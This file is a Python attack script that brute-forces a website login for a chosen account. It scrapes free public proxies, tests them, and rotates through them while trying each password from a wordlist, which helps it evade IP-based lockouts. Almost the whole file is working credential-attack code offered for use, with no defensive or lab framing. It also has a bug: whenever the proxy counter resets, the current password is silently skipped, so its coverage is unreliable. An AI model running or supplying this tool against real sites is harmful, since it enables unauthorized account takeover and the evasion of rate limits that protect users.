import requests
from bs4 import BeautifulSoup

#define vars https://targeturl.com
target_url = str(input('Target url (include https://): '))
web_username = str(input('If credentials are needed to access website insert Username/Leave blank if not: '))
web_password = str(input('If credentials are needed to access website insert Password/Leave blank if not: '))
login_failed = str(input('Paste the sentence shown when login failed: '))
if web_username != '' and web_password != '':
    start_index = target_url.find('https:')
    end_index = target_url.find('//', start_index) + len('//')
    target_url = target_url[:end_index] + web_username + ':' + web_password + '@' + target_url[end_index:]
target_username = str(input('Account Username to try brute force: '))
get_proxies_url = 'https://free-proxy-list.net/'
check_proxies_url = 'https://ipinfo.io/json'
working_proxies = []

#function to grab proxies with HTTPS option
def scrape_proxy_list(get_proxies_url, num_proxies=300):
    try:
        response = requests.get(get_proxies_url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        proxy_list = []

        table = soup.find('table', class_='table-striped')
        if table:
            rows = table.find_all('tr')[1:num_proxies+1]  #skip the header row

            for row in rows:
                cols = row.find_all('td')
                ip_address = cols[0].text.strip()
                https_support = cols[6].text.strip()
                if https_support.lower() == 'yes':
                    proxy_list.append(ip_address)
        else:
            print("Error: Couldn't find the proxy list table.")

        return proxy_list

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return []

#get list
proxy_list = scrape_proxy_list(get_proxies_url)

#confirm proxies are working
for proxy in proxy_list:
    print(f'trying: {proxy}')
    try:
        r = requests.get(check_proxies_url, proxies={'http': proxy, 'https': proxy}, timeout=2)
        if r.status_code == 200 and proxy in r.content.decode():
            print(f'[+]{proxy} worked---')
            working_proxies.append(proxy)
    except Exception:
        print(f'[-]{proxy} is not working. Trying next...')
        continue
    
print(working_proxies)

#function to brute force while rotating proxies
def send_request():
    counter = 0
    for password in passwords:
        password = password.strip()
        if counter < len(working_proxies):
            print('using proxy:', working_proxies[counter])
            response = requests.get(target_url, proxies={'http': working_proxies[counter], 'https': working_proxies[counter]}, data={'Username': target_username, 'Password': password, 'Submit': 'submit'})
            counter = counter+1
            if login_failed in response.content.decode():
                print('[-]', password, 'is invalid')
            else:
                print('[+] the correct password is:', password)
                break
        else:
            counter = 0

#run brute force 
with open('passwordlist.txt', 'r') as passwords:
    send_request()
